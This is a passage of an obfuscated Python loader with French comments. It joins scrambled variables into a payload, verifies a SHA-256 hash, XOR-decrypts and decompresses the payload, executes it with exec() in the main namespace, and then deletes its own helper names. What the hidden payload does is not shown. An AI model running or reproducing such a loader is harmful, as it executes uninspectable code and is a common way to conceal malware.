_cgBVHCvEq3D8Io + _cqL5K_KZdBDuNm + _caB3zdtjAQSIKG + _ccbLaJXtt2RrE5 + _cvBdGHC73FHQP0 + _cyEv6FM_thSYR7 + _cykJCU6j9DEdxc + _cbBODWq9q9r31q + _ceHDEmG3DOzoRX + _ceuMq98ZhlKpxg + _cssCulclxm7aFN + _ccqLxJFIKWxAdy + _cfYcekepWasmFO + _chAwzArVl9kuEL + _czZLR4AJIxXgrC + _coDCswMOMFLUne + _cfLboTvcXXKYxo + _cuyYvsRR4c9Vuw + _ceEEZQuE92VnFw + _cmxs2_8M52LuH8 + _cfAifZRCslMRFz + _ccaKQFcpGT4jij + _cwrb8gepELnpBO + _cmZh10rJGnZZjT + _c_e3Mt0kJMTUwv + _cbb5KuCeJKJbT4 + _chZS4mddRDzZTG + _ckIKHq1f37fADu + _cgEaXhDWK6yJxW + _cv6WwQMwqNTzwO + _cfpNOdJ474tiN8 + _ccZZYRMaJuNhTf + _cjDz_ElmAE9uNG + _caer1cHExBRU8r + _ckwEMVIo36wZw0 + _c_i6lcw_VOwhCt + _carlkj2hnjBlao + _cqa5P8a2BwjvY2 + _ckgghiOryBuGrY + _chbTJbOGYtS2lk + _cqqnaX6xNor6lD + _crRSwRElBxEk2G + _colzQhmIkDRAiL + _cvCfO4Zx3CxBEf + _ckyM7vRxVxidPp + _cfl6NtmQ2F6fgp + _cuQzgn0QxOXLkF + _c_yCtb3NdT7IIr + _cxGr6_Pr2_GB0q + _cuyQmWQ7zb2SOE + _cbjUWqcuCHwIzM + _clcSl4iKHk2zCz + _cdtrPKZb5Gl8YA + _cpdZ_vFmGbpa5_ + _ce2NbZt9jgVRyw + _cdl2BN4eFMoaLB + _cqhi3szsvGmGyG + _cnkxoW0kG4CHyY + _cvjs8jtw2AIR2m + _cmilDix4LdPD14 + _csxeyaOFu6FKwc + _culnbzPPRkSniC + _cpxSQenS4R8M2C + _cjFBw_7iGJreAu + _cvIRVrhlzNyUbr + _cbpgW9cVf6_t3h + _cgi7mfeLn9BMV2 + _cm4hZZLrvrG8E4 + _clbEuq08AvQLNK + _caps78xUFjfQ8O + _cs4PHRp6GN0Z28 + _creIHGpaSCHpYU + _cw9gVkCDhswsVX + _ckUf75cLor6jcG + _chYdCejIXYIhXz + _cqM62ae8Mep482 + _cijNLIA3TpW99p + _cws9HVKpruJNPG + _ckQmFoKH6CS4Wc + _cwVF5RYStbnfJw + _cz2L4J5qcgmEjz + _cyLiFKLZG5ah0j + _ciCpxyKkoesFTA + _cqDQYQUgyJ0hcx + _crvQIanvkS8uu7 + _cyiArRCCEtUjiT)
if __import__('hashlib').sha256(_pd64HVIsw4Xz6i).hexdigest() != 'ea526e8c5d153e3e5a3607526085590da23ca94f7919967cdff40cb8136611e0':
    __import__('sys').exit(1)
_xzsqa_Z3dljvL8 = bytes([86, 27, 33, 89, 6, 44, 93, 164, 191, 219, 114, 115, 92, 149, 66, 21, 139, 73])
_fkoewn_CTz8HJOW = bytes([60, 105, 86, 153, 195, 47, 194, 189, 62, 191, 155, 71, 245, 211, 129, 192, 93, 214])

def _fxbWvC6KEASkW1u(_bqcysQPaJBD8Gk, _k_iQi2xdX2xxHM):
    return bytes(_bqcysQPaJBD8Gk[_if9bO5G4E3RpuT] ^ _k_iQi2xdX2xxHM[_if9bO5G4E3RpuT % len(_k_iQi2xdX2xxHM)] for _if9bO5G4E3RpuT in range(len(_bqcysQPaJBD8Gk)))

def _fdkkGottAvOVX83(_trC5SMoiVSyfzf):
    import zlib
    return zlib.decompress(_trC5SMoiVSyfzf) # Un seul niveau de zlib ici pour simplifier

def _fepDI4EQsadrS3v():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xiob3rhxTLfnAr = _fxbWvC6KEASkW1u(_pd64HVIsw4Xz6i, _xzsqa_Z3dljvL8)
    # 2. Décompression Zlib
    _dcXpMJ4boq1kIb = _fdkkGottAvOVX83(_xiob3rhxTLfnAr)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dcXpMJ4boq1kIb.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _n_7rhe5kgH69q_ = _main.__dict__
    _n_7rhe5kgH69q_.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _n_7rhe5kgH69q_)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fepDI4EQsadrS3v()
try:
    del _fxbWvC6KEASkW1u, _fdkkGottAvOVX83, _fepDI4EQsadrS3v
    del _pd64HVIsw4Xz6i, _xzsqa_Z3dljvL8, _fkoewn_CTz8HJOW
except:
    pass
